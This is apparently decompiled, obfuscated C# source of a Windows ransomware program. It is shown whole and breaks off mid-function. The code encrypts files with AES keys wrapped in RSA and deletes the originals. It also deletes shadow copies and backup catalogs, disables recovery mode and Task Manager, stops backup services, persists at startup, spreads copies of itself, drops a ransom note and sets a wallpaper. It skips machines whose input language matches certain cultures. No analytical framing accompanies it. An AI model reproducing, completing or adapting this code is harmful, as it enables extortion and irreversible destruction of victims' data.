using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public unsafe static IntPtr intpreclp = new IntPtr(-7 + sizeof(float));

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	internal delegate int GetProcA();

	internal delegate int GetProcA2(IntPtr intptr_0, ref int int_0);

	internal delegate int WL(IntPtr intptr_0, IntPtr intptr_1);

	internal delegate int GetProcA3(WL wl_0, IntPtr intptr_0);

	private static readonly byte[] _salt = new byte[Convert.ToInt32(34.77258872223978 - Math.Log(16.0))];

	private static string userName = Environment.UserName;

	private static string userDir = _003CModule_003E.SERT("蒧蓞蒸蒱蒗蒁蒖蒗蒸", Convert.ToInt32(1313834212.0));

	public static string appMutexRun = _003CModule_003E.SERT("竊窈窉竔竟竔竘竎竛窋窎竒竏窋竑窊竖竑竅", Convert.ToInt32(2204907546.0 - Math.Truncate(734969182.0)));

	public unsafe static bool encryptionAesRsa = (byte)(-3 + sizeof(float)) != 0;

	public static string encryptedFileExtension = "";

	private unsafe static bool checkSpread = (byte)(-3 + sizeof(float)) != 0;

	private static string spreadName = _003CModule_003E.SERT("ꦏꦉꦎꦌꦎꦕꦏꦙ꧒ꦙꦄꦙ", Convert.ToInt32(744644252.0995545 + Math.Sqrt(372331774.0)));

	private unsafe static bool checkCopyRoaming = (byte)(-3 + sizeof(float)) != 0;

	private unsafe static string processName = _003CModule_003E.SERT("\u1b82ᮇᮒᮙᮞ\u1b82ᮅᯟᮔᮉᮔ", (1041845363 + sizeof(float)) ^ (292771714 + sizeof(float)));

	public static string appMutexRun2 = _003CModule_003E.SERT("\u103aန\u103bဂ\u103c\u1030\u103a\u102fငစဦဇသ\u1062ဗဿ\u106dၦဧၡ", Convert.ToInt32(1341788245.0));

	private unsafe static bool checkStartupFolder = (byte)(-3 + sizeof(float)) != 0;

	private unsafe static bool checkSleep = (byte)(-4 + sizeof(float)) != 0;

	private unsafe static int sleepTextbox = (943949324 + sizeof(float)) ^ (943949334 + sizeof(float));

	private static string base64Image = _003CModule_003E.SERT("빒븓븐븂블빇빅븸븜븐븖블", Convert.ToInt32(1745460649.0 - Math.Floor(581820216.5)));

	public static string appMutexStartup = _003CModule_003E.SERT("템턜턟턕텝턋턟턉턜턉턘턟텝턁턁턁턎텛턈턗턀", Convert.ToInt32(69587309.0));

	private static string droppedMessageTextbox = _003CModule_003E.SERT("ⲡⲶⲲⲷⲌⲺⲧ⳽ⲧⲫⲧ", Convert.ToInt32(231719740.0 - Math.Floor(77239913.5)));

	private unsafe static bool checkAdminPrivilage = (byte)(-3 + sizeof(float)) != 0;

	private unsafe static bool checkdeleteShadowCopies = (byte)(-3 + sizeof(float)) != 0;

	private unsafe static bool checkdisableRecoveryMode = (byte)(-3 + sizeof(float)) != 0;

	private unsafe static bool checkdeleteBackupCatalog = (byte)(-3 + sizeof(float)) != 0;

	private unsafe static bool disableTaskManager = (byte)(-3 + sizeof(float)) != 0;

	private unsafe static bool checkStopBackupServices = (byte)(-3 + sizeof(float)) != 0;

	public static string appMutexStartup2 = _003CModule_003E.SERT("\ua69eꚖꛫꛟꛥꛮ\ua6f8ꛝꚙꛡꛬ\ua6f9\ua6fbꚝ", Convert.ToInt32(791586470.4025316 + Math.Log10(395793239.5)));

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = _003CModule_003E.SERT("䳞䳟", Convert.ToInt32(1593658556.786467 + Math.Cos(796829278.0)));

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex(_003CModule_003E.SERT("ˈ\u02df\u02daʻˑ\u02d3ʽʛˑʝʻʁˍʋʍˍʚʡˍʨʪˍʮʰˍʺˑˍ\u02d9ʽʛ\u02d2\u02d6ˌ\u02d3\u02d3ʝʜʂʃˑʻʁˍʚːˍ\u02d9ʽʛ\u02d3\u02d9ˌ\u02d5\u02d9ʝˉ", Convert.ToInt32(1953891408.0 - Math.Floor(651297136.0))));

	private unsafe static List<string> messages = new List<string>
	{
		_003CModule_003E.SERT("낙낲낳냺납냽낪낲낯낯낤냱냽낤낲남냽낾낼낳냽낯낸납남낯낳냽낼낱낱냽낤낲남낯냽낻내낱낸낮냼", Convert.ToInt32(416864367.0 + Math.Round(416864366.5))),
		"",
		_003CModule_003E.SERT("떳떞떞뗒떋떝떇떀뗒떔떛떞떗떁뗒떞떛떙떗뗒떖떝떑떇떟떗떜떆떁뗞뗒떂떚떝떆떝떁뗞뗒떖떓떆떓떐떓떁떗떁뗒떓떜떖뗒떝떆떚떗떀뗒떛떟떂떝떀떆떓떜떆뗒떓떀떗뗒떗떜떑떀떋떂떆떗떖", Convert.ToInt32(294303217.03750074 + Math.Cos(147151609.0))),
		"",
		_003CModule_003E.SERT("뭃뭼뭵뭠무뭳뭡뭵뭦뭵뭺뭠뭱뭱뭧무뭰뭻무뭣뭱무뭳뭽뭢뭱무뭠뭻무뭭뭻뭡묫", Convert.ToInt32(287685396.59671384 + Math.Tan(143842698.0))),
		"",
		_003CModule_003E.SERT("⬻⬍⬗⭂⬁⬃⬌⭂⬑⬇⬌⬆⭂⭑⭂⬍⬄⭂⬛⬍⬗⬐⭂⬇⬌⬁⬐⬛⬒⬖⬇⬆⭂⬄⬋⬎⬇⬑⭂⬃⬌⬆⭂⬕⬇⭂⬆⬇⬁⬐⬛⬒⬖⭂⬋⬖⭂⬄⬍⬐⭂⬄⬐⬇⬇⭌", Convert.ToInt32(890383201.4676663 - Math.Tan(445191601.0))),
		"",
		_003CModule_003E.SERT("\ud7c9\ud7ffퟥힰ\ud7fdퟥퟣퟤힰퟶ\ud7ff\ud7fc\ud7fc\ud7ffퟧힰퟤퟸퟵퟣퟵힰퟣퟤퟵퟠퟣힰퟄ\ud7ffힰퟴퟵퟳퟢퟩퟠퟤힰퟩ\ud7ffퟥퟢힰퟶퟹ\ud7fcퟵퟣힰ\ud7aaힰힰힰ", (1372143249 + sizeof(float)) ^ (1517218049 + sizeof(float))),
		_003CModule_003E.SERT("꺃꺛꺒껖껟꺒껟껗꺒껠껗껖껷껜껕껛껜껗꺑꺀꺂꺇꺊", Convert.ToInt32(343387826.0)),
		"",
		_003CModule_003E.SERT("掁掚掓揼揑揇插揚揝掓揫揾握掓掛揪揜揆掓換插揅揖掓揇揜掓揃插揊掓揕揜揁掓揗揖提揁揊揃揇揚揜揝掓揚揝掓揫揾握掝", Convert.ToInt32(1232036785.8073666 - Math.Tan(616018393.5))),
		_003CModule_003E.SERT("⊒⊵⊧⊶⊡⋳⊣⊲⊪⊾⊶⊽⊧⋳⊤⊶⋳⊤⊺⊿⊿⋳⊠⊶⊽⊷⋳⊪⊼⊦⋳⊧⊻⊶⋳⊧⊼⊼⊿⋳⊧⊻⊲⊧⋳⊤⊺⊿⊿⋳⊷⊶⊰⊡⊪⊣⊧⋳⊲⊿⊿⋳⊪⊼⊦⊡⋳⊵⊺⊿⊶⊠⋽⋺", Convert.ToInt32(463507817.5 + Math.Abs(463507817.5)))
	};

	private static string[] validExtensions;

	private static Random random;

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private unsafe static void Main(string[] args)
	{
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		RTA();
		if (forbiddenCountry())
		{
			MessageBox.Show(_003CModule_003E.SERT("땎땧땺땪땡땬땬땭땦딨땋땧땽땦땼땺땱", Convert.ToInt32(1637528840.0)));
			return;
		}
		if (RegistryValue())
		{
			new Thread((ThreadStart)delegate
			{
				Run();
			}).Start();
		}
		if (isOver())
		{
			return;
		}
		if (AlreadyRunning())
		{
			Environment.Exit(-3 + sizeof(float));
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			registryStartup();
		}
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
			if (disableTaskManager)
			{
				DisableTaskManager();
			}
			if (checkStopBackupServices)
			{
				stopBackupServices();
			}
		}
		lookForDirectories();
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private unsafe static bool forbiddenCountry()
	{
		string[] array = new string[Convert.ToInt32(1.0 + Math.Abs(1.0))];
		array[-4 + sizeof(float)] = _003CModule_003E.SERT("䯀䯛䮌䯭䯀䯕䯏䮌䯠䯻", (1025983565 + sizeof(float)) ^ (803803116 + sizeof(float)));
		array[-3 + sizeof(float)] = _003CModule_003E.SERT("堻堽塢堛堝", Convert.ToInt32(1382832207.0));
		string[] array2 = array;
		string[] array3 = array2;
		for (int i = -4 + sizeof(float); i < array3.Length; i += -3 + sizeof(float))
		{
			string text = array3[i];
			try
			{
				string name = InputLanguage.get_CurrentInputLanguage().get_Culture().Name;
				if (name == text)
				{
					return (byte)(-3 + sizeof(float)) != 0;
				}
			}
			catch
			{
			}
		}
		return (byte)(-4 + sizeof(float)) != 0;
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly()!.Location);
		string folderPath = Environment.GetFolderPath((Environment.SpecialFolder)Convert.ToInt32(25.092553218549803 + Math.Cos(13.0)));
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * Convert.ToInt32(500.0 + Math.Truncate(500.0)));
		}
	}

	private unsafe static bool RegistryValue()
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(_003CModule_003E.SERT("\uf6fd\uf6c1\uf6c8\uf6da\uf6d9\uf6cf\uf6dc\uf6cb\uf6f2", Convert.ToInt32(1587541678.0)) + appMutexRun2);
			object value = registryKey.GetValue(appMutexRun2);
			registryKey.Close();
			if (value.ToString()!.Length > -4 + sizeof(float))
			{
				return (byte)(-4 + sizeof(float)) != 0;
			}
			return (byte)(-3 + sizeof(float)) != 0;
		}
		catch
		{
			return (byte)(-3 + sizeof(float)) != 0;
		}
	}

	private unsafe static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		for (int i = -4 + sizeof(float); i < array.Length; i += -3 + sizeof(float))
		{
			Process process = array[i];
			try
			{
				if (process.Modules[-4 + sizeof(float)].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return (byte)(-3 + sizeof(float)) != 0;
				}
			}
			catch (Exception)
			{
			}
		}
		return (byte)(-4 + sizeof(float)) != 0;
	}

	public unsafe static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = -4 + sizeof(float); i < length; i += -3 + sizeof(float))
		{
			char value = _003CModule_003E.SERT("鋚鋙鋘鋟鋞鋝鋜鋓鋒鋑鋐鋗鋖鋕鋔鋋鋊鋉鋈鋏鋎鋍鋌鋃鋂鋁銋銊銉銈銏銎銍銌銃銂", Convert.ToInt32(794727118.8003621 - Math.Log(397363549.5)))[random.Next(-4 + sizeof(float), _003CModule_003E.SERT("靁靂靃靄靅靆靇靈靉靊靋靌靍靎靏靐靑青靓靔靕靖靗靘静靚霐霑霒霓霔霕霖霗霘霙", Convert.ToInt32(780179240.5911644 - Math.Log10(390089616.0))).Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public unsafe static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = -4 + sizeof(float); i < length; i += -3 + sizeof(float))
			{
				char value = _003CModule_003E.SERT("ᥫᥨᥩ\u196e\u196fᥬᥭᥢᥣᥠᥡᥦᥧᥤᥥ\u197a\u197b\u1978\u1979\u197e\u197f\u197c\u197dᥲᥳᥰ\u193a\u193b\u1938\u1939\u193e\u193f\u193c\u193d\u1932\u1933", Convert.ToInt32(795511941.0 + Math.Truncate(795511941.0)))[random.Next(-4 + sizeof(float), _003CModule_003E.SERT("翦翥翤翣翢翡翠翯翮翭翬翫翪翩翨翷翶翵翴翳翲翱翰翿翾翽羷羶羵羴羳羲羱羰羿羾", Convert.ToInt32(792100723.2029481 + Math.Log(396050371.5))).Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	private unsafe static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool checkCrypted = (byte)(-3 + sizeof(float)) != 0;
			string extension;
			Parallel.For(-4 + sizeof(float), files.Length, delegate(int i)
			{
				try
				{
					extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (Array.Exists(validExtensions, (string E) => E == extension.ToLower()) && fileName != droppedMessageTextbox)
					{
						FileInfo fileInfo = new FileInfo(files[i]);
						try
						{
							fileInfo.Attributes = (FileAttributes)(124 + sizeof(float));
						}
						catch
						{
						}
						string text = CreatePassword(36 + sizeof(float));
						if (fileInfo.Length < (uint)(-1926258180 + sizeof(float)))
						{
							if (checkDirContains(files[i]))
							{
								string keyRSA = RSA_Encrypt(text, rsaKey());
								AES_Encrypt(files[i], text, keyRSA);
							}
						}
						else
						{
							AES_Encrypt_Large(files[i], text, fileInfo.Length);
						}
						if (checkCrypted)
						{
							checkCrypted = (byte)(-4 + sizeof(float)) != 0;
							string path = location + _003CModule_003E.SERT("珹", 2065134546 + sizeof(float)) + droppedMessageTextbox;
							string folderPath = Environment.GetFolderPath((Environment.SpecialFolder)(21 + sizeof(float)));
							if (!File.Exists(path) && location != folderPath)
							{
								File.WriteAllLines(path, messages);
							}
						}
					}
				}
				catch (Exception)
				{
				}
			});
			string[] childDirectories = Directory.GetDirectories(location);
			Parallel.For(-4 + sizeof(float), childDirectories.Length, delegate(int i)
			{
				try
				{
					new DirectoryInfo(childDirectories[i]).Attributes &= (FileAttributes)(-133 + sizeof(float));
				}
				catch
				{
				}
				encryptDirectory(childDirectories[i]);
			});
		}
		catch (Exception)
		{
		}
	}

	private unsafe static bool checkDirContains(string directory)
	{
		directory = directory.ToLower();
		string[] array = new string[Convert.ToInt32(13.920558458320164 + Math.Log(8.0))];
		array[-4 + sizeof(float)] = _003CModule_003E.SERT("\ue3c5\ue3d4\ue3d4\ue3c0\ue3c5\ue3d0\ue3c5\ue3f8\ue3c8\ue3cb\ue3c7\ue3c5\ue3c8", Convert.ToInt32(491185059.0 + Math.Tanh(245592530.0)));
		array[-3 + sizeof(float)] = _003CModule_003E.SERT("䋃䋒䋒䋆䋃䋖䋃䋾䋎䋍䋁䋃䋎䋎䋍䋕", Convert.ToInt32(1371488932.9113736 + Math.Tan(685744465.0)));
		array[Convert.ToInt32(2.0 + Math.Log(1.0))] = _003CModule_003E.SERT("┭┫┽┪┫┄┹┴┴╸┭┫┽┪┫", Convert.ToInt32(686789292.0 + Math.Abs(686789292.0)));
		array[Convert.ToInt32(2.0025050133959454 + Math.Sin(1.5))] = _003CModule_003E.SERT("︵︹\ufe1b\ufe06\ufe0e\ufe1b\ufe08\ufe04\ufe2d\ufe08\ufe1d\ufe08", Convert.ToInt32(1343749737.242647 - Math.Sin(671874868.5)));
		array[Convert.ToInt32(4.0)] = _003CModule_003E.SERT("\uee39\uee34\uee34\uee2f\uee75\uee32\uee35\uee32", Convert.ToInt32(1038771592.5 - Math.Abs(346257197.5)));
		array[Convert.ToInt32(4.083709268125845 + Math.Log(2.5))] = _003CModule_003E.SERT("쌃쌎쌎쌕쌇쌎쌏쌕썏쌃쌈쌏", Convert.ToInt32(1406780256.0 + Math.Tanh(703390128.5)));
		array[Convert.ToInt32(4.267949192431123 + Math.Sqrt(3.0))] = _003CModule_003E.SERT("＋＆＆＝ｇ\uff00＇\uff00", Convert.ToInt32(2006974292.273253 + Math.Log(1003487156.5)));
		array[Convert.ToInt32(7.9364566872907965 + Math.Cos(3.5))] = _003CModule_003E.SERT("㰛㰑㰝㰜㰑㰓㰑㰚㰗㱜㰖㰐", (41682083 + sizeof(float)) ^ (203569361 + sizeof(float)));
		array[Convert.ToInt32(8.0)] = _003CModule_003E.SERT("ꖳꖩꖨꖮꖸꖯꗳꖹꖼꖩ", Convert.ToInt32(1362273736.660726 + Math.Log(681136878.5)));
		array[Convert.ToInt32(9.21079579943078 + Math.Cos(4.5))] = _003CModule_003E.SERT("\udec5\udedf\udede\uded8\udece\uded9\ude85\udecf\udeca\udedf\ude85\udec7\udec4\udecc", Convert.ToInt32(2718387712.0 - Math.Floor(906129237.5)));
		array[Convert.ToInt32(10.0)] = _003CModule_003E.SERT("辉输辒辔辂辕迉辎辉辎", Convert.ToInt32(314019806.8040729 + Math.Log10(157009907.5)));
		array[Convert.ToInt32(11.0)] = _003CModule_003E.SERT("烞烂烟烇烈烙炄烎烈", Convert.ToInt32(617789525.0 + Math.Floor(617789525.0)));
		array[Convert.ToInt32(11.039829713349635 + Math.Cos(6.0))] = _003CModule_003E.SERT("碠碴碵碮碳碴碯磯碨碯碧", Convert.ToInt32(1477671105.0));
		array[Convert.ToInt32(13.0)] = _003CModule_003E.SERT("뻒뻟뻟뻄뻃뻕뻓뻄뺞뻒뻑뻛", Convert.ToInt32(2095071298.0946057 + Math.Sqrt(1047551832.0)));
		array[Convert.ToInt32(14.845098040014257 - Math.Log10(7.0))] = _003CModule_003E.SERT("\uf42e\uf423\uf423\uf438\uf421\uf42b\uf42a\uf43b\uf462\uf429\uf42a\uf425", Convert.ToInt32(607156774.0 + Math.Round(607156774.0)));
		array[Convert.ToInt32(17.73861278752583 - Math.Sqrt(7.5))] = _003CModule_003E.SERT("욭욬욺욢욽욦욹웧욠욧욠", Convert.ToInt32(1058260680.877614 + Math.Cos(529130340.5)));
		string[] array2 = array;
		string[] array3 = array2;
		int num = -4 + sizeof(float);
		while (true)
		{
			if (num < array3.Length)
			{
				string value = array3[num];
				if (directory.Contains(value))
				{
					break;
				}
				num += -3 + sizeof(float);
				continue;
			}
			return (byte)(-3 + sizeof(float)) != 0;
		}
		return (byte)(-4 + sizeof(float)) != 0;
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine(_003CModule_003E.SERT("\ue1cd\ue1ce\ue189\ue19c\ue19d\ue1d1\ue187\ue194\ue183\ue182\ue198\ue19e\ue19f\ue1cc\ue1d3\ue1c0\ue1df\ue1c1\ue1d3\ue1d1\ue194\ue19f\ue192\ue19e\ue195\ue198\ue19f\ue196\ue1cc\ue1d3\ue184\ue185\ue197\ue1dc\ue1c0\ue1c7\ue1d3\ue1ce\ue1cf", Convert.ToInt32(1902170857.0 - Math.Truncate(634056952.5))));
		stringBuilder.AppendLine(_003CModule_003E.SERT("퍔팺팻팩팸팉팚팉팅팍팜팍팚팛퍈판팅팄팆팛퍒판팛파퍕퍊팀팜팜팘퍒퍇퍇팟팟팟퍆팟퍛퍆팇팚팏퍇퍚퍘퍘퍙퍇팰팥팤팻팋팀팍팅팉퍊퍈판팅팄팆팛퍒판팛팁퍕퍊팀팜팜팘퍒퍇퍇팟팟팟퍆팟퍛퍆팇팚팏퍇퍚퍘퍘퍙퍇팰팥팤팻팋팀팍팅팉퍅팁팆팛팜팉팆팋팍퍊퍖", Convert.ToInt32(584307551.5343885 + Math.Log10(292153780.0))));
		stringBuilder.AppendLine(_003CModule_003E.SERT("\u0875\u0875ࡩࠐ\u082d\u0825࠺࠻࠰࠻\u0821\u086bࠔࠄࠔ\u0817ࡩ\u087aࠐ\u082d\u0825࠺࠻࠰࠻\u0821\u086b", Convert.ToInt32(2118846549.0)));
		stringBuilder.AppendLine(_003CModule_003E.SERT("䕑䕑䕍䔼䔞䔕䔄䔝䔄䔂䕏䔈䔃䔘䔣䕄䔀䔋䔴䔥䔿䔃䔫䕞䔶䕃䔋䔂䔀䔒䔨䕀䔋䔡䔧䔸䔽䔫䔿䔟䔾䔜䔥䕁䔻䔃䔘䕃䔀䔘䔠䔳䕈䔒䔲䔗䔃䔝䔧䔳䕀䔿䔳䔂䔋䔒䔋䔣䔽䔃䔻䔒䔄䔕䔟䔜䔚䔛䔰䕀䔨䔔䔵䔿䔃䔄䔋䕅䔣䔚䕅䔉䔵䔜䔓䔜䕅䕚䔔䔆䔅䔚䔩䔗䔕䔘䔖䔒䔛䔾䕁䔈䔈䕞䔵䔐䔀䔧䔂䔔䔾䔃䔓䔋䕇䔷䔀䔜䔒䔕䔜䕄䔸䕞䔥䔴䕇䔧䕉䔵䕂䕀䔤䔢䕚䔣䔵䔉䔨䔺䕈䕀䔤䔦䔘䔽䕇䔸䔶䔈䔆䔗䔋䔐䔲䔩䔓䔝䔇䔇䔕䔶䔂䔠䔘䔧䕚䔉䔸䔸䔇䔢䕀䔴䕅䔣䔴䔟䕁䕃䔝䔸䔾䔿䔇䔢䕄䔵䔐䔚䔥䔈䔂䕆䔠䔠䔗䔓䔕䔥䕂䔒䔄䔶䔅䔤䔤䔩䔐䕞䕇䔂䔰䔂䕇䔆䔜䔦䔕䔄䔣䔩䔀䕇䔼䔤䔥䔣䔼䕀䔞䔠䔈䔔䔤䔫䔨䔣䔕䔲䔣䔤䔺䔟䔩䔹䔷䔁䔵䔾䔡䔕䔶䔆䔧䕉䔂䔰䔄䔤䔟䔘䔽䕉䔴䔠䔲䔡䔀䔽䔝䔋䔃䔝䔓䕂䕁䔠䔷䔕䕄䔕䕞䔞䔔䔓䔨䔤䔝䔟䔹䔴䕇䔚䔉䔒䔩䔡䕞䔟䔗䔡䔳䔣䔛䔩䕂䕈䕚䔣䔤䔡䔧䔅䕀䔰䔟䔕䕉䔿䔳䔫䔀䕈䔸䕉䔴䔜䔿䔉䔀䔨䔚䕃䔚䔕䕚䔤䔈䔅䔙䕁䔠䕌䕌䕍䕞䔼䔞䔕䔄䔝䔄䔂䕏", Convert.ToInt32(1935361372.3095872 + Math.Log(967680696.5))));
		stringBuilder.AppendLine(_003CModule_003E.SERT("\ufff1￢ﾟﾞﾌﾝﾬ\uffbfﾬﾠﾨﾹﾨ\uffbfﾾ\ufff3", Convert.ToInt32(428015564.05909747 - Math.Cos(214007782.5))));
		return stringBuilder.ToString();
	}

	public unsafe static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (true)
		{
			int num = -4 + sizeof(float);
			int num2 = length;
			length = num2 - (-3 + sizeof(float));
			if (num >= num2)
			{
				break;
			}
			stringBuilder.Append(_003CModule_003E.SERT("帀布市帅帄帇帆帉师帋帊帍希帏帎帑帐帓帒帕帔帗帖帙帘帛帠帣帢帥帤帧带帩帨師帪席帬帯帮帱帰帳帲帵帴帷帶帹常帻幐幓幒幕幔幗幖幙幘幑幋幀幜幇幞幇幎", Convert.ToInt32(1830575713.0))[random.Next(_003CModule_003E.SERT("艧艤艥艢艣艠艡艮良艬艭艪艫艨艩艶艷艴艵色艳艰艱艾艿艼艇艄艅艂艃艀艁艎艏艌艍艊艋艈艉艖艗艔艕艒艓艐艑艞艟艜舷舴舵舲舳舰舱舾舿舶般舧舻舠船舠舩", Convert.ToInt32(864043785.0 - Math.Abs(288014595.0))).Length)]);
		}
		return stringBuilder.ToString();
	}

	private unsafe static void AES_Encrypt(string inputFile, string password, string keyRSA)
	{
		string path = inputFile + _003CModule_003E.SERT("ꫪ", (488599141 + sizeof(float)) ^ (1421853865 + sizeof(float))) + RandomStringForExtension(Convert.ToInt32(5.414213562373095 - Math.Sqrt(2.0)));
		byte[] array = new byte[Convert.ToInt32(7.243197504692072 - Math.Sin(4.0))];
		RuntimeHelpers.InitializeArray(array, (RuntimeFieldHandle)/*OpCode not supported: LdMemberToken*/);
		byte[] array2 = array;
		FileStream fileStream = new FileStream(path, (FileMode)Convert.ToInt32(3.0 - Math.Sqrt(1.0)));
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = Convert.ToInt32(128.9200260381968 - Math.Sin(64.0));
		rijndaelManaged.BlockSize = Convert.ToInt32(128.0);
		rijndaelManaged.Padding = (PaddingMode)((948584282 + sizeof(float)) ^ (948584280 + sizeof(float)));
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array2, -3 + sizeof(float));
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / Convert.ToInt32(8.602059991327963 - Math.Log10(4.0)));
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / Convert.ToInt32(4.0 + Math.Ceiling(4.0)));
		rijndaelManaged.Mode = (CipherMode)(-3 + sizeof(float));
		fileStream.Write(array2, -4 + sizeof(float), array2.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), (CryptoStreamMode)(-3 + sizeof(float)));
		FileStream fileStream2 = new FileStream(inputFile, (FileMode)Convert.ToInt32(2.929262798332297 + Math.Cos(1.5)));
		fileStream2.CopyTo(cryptoStream);
		fileStream2.Flush();
		fileStream2.Close();
		cryptoStream.Flush();
		cryptoStream.Close();
		fileStream.Close();
		using (FileStream stream = new FileStream(path, (FileMode)Convert.ToInt32(3.0 + Math.Abs(3.0)), (FileAccess)Convert.ToInt32(3.0 - Math.Ceiling(1.0))))
		{
			using StreamWriter streamWriter = new StreamWriter(stream);
			streamWriter.Write(keyRSA);
			streamWriter.Flush();
			streamWriter.Close();
		}
		File.WriteAllText(inputFile, _003CModule_003E.SERT("쉄", Convert.ToInt32(599646525.0 + Math.Round(599646525.5))));
		File.Delete(inputFile);
	}

	private unsafe static void AES_Encrypt_Large(string inputFile, string password, long lenghtBytes)
	{
		GenerateRandomSalt();
		using FileStream fileStream = new FileStream(inputFile + _003CModule_003E.SERT("䚍", Convert.ToInt32(747390626.0 + Math.Tanh(373695313.5))) + RandomStringForExtension(Convert.ToInt32(2.585786437626905 + Math.Sqrt(2.0))), (FileMode)Convert.ToInt32(1.0 + Math.Ceiling(1.0)), (FileAccess)Convert.ToInt32(1.0 + Math.Truncate(1.0)), (FileShare)(-4 + sizeof(float)));
		fileStream.SetLength(lenghtBytes);
		File.WriteAllText(inputFile, _003CModule_003E.SERT("邺", Convert.ToInt32(278302853.0)));
		File.Delete(inputFile);
	}

	public unsafe static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[Convert.ToInt32(32.0)];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		for (int i = -4 + sizeof(float); i < Convert.ToInt32(10.0); i += -3 + sizeof(float))
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		return array;
	}

	public unsafe static string RSA_Encrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(Convert.ToInt32(2041.0685281944006 + Math.Log(1024.0)));
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, (byte)(-3 + sizeof(float)) != 0);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = (byte)(-4 + sizeof(float)) != 0;
		}
	}

	private unsafe static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		for (int i = -4 + sizeof(float); i < drives.Length; i += -3 + sizeof(float))
		{
			DriveInfo driveInfo = drives[i];
			string pathRoot = Path.GetPathRoot(Environment.SystemDirectory);
			if (driveInfo.ToString() == pathRoot)
			{
				string[] array = new string[Convert.ToInt32(12.0)];
				array[-4 + sizeof(float)] = _003CModule_003E.SERT("ᑫᑉᑔᑜᑉᑚᑖᐛᑽᑒᑗᑞᑈ", Convert.ToInt32(1533451865.0 - Math.Round(511150621.5)));
				array[-3 + sizeof(float)] = _003CModule_003E.SERT("聉聫聶聾聫聸聴耹聟聰聵聼聪耹耱聡耡耯耰", Convert.ToInt32(1427669017.0));
				array[Convert.ToInt32(2.0 - Math.Log10(1.0))] = _003CModule_003E.SERT("\ud9a5\ud99b\ud99c\ud996\ud99d\ud985\ud981", Convert.ToInt32(1236064753.0320194 - Math.Sin(618032377.0)));
				array[Convert.ToInt32(1.775255128608411 + Math.Sqrt(1.5))] = _003CModule_003E.SERT("汓氥氒气氎气氛氒汙氵氞氙", Convert.ToInt32(221353359.0484552 - Math.Sqrt(110671419.5)));
				array[Convert.ToInt32(3.6989700043360187 + Math.Log10(2.0))] = _003CModule_003E.SERT("鼭鼳鼯鼣鼁鼃鼈鼅", Convert.ToInt32(474390368.0));
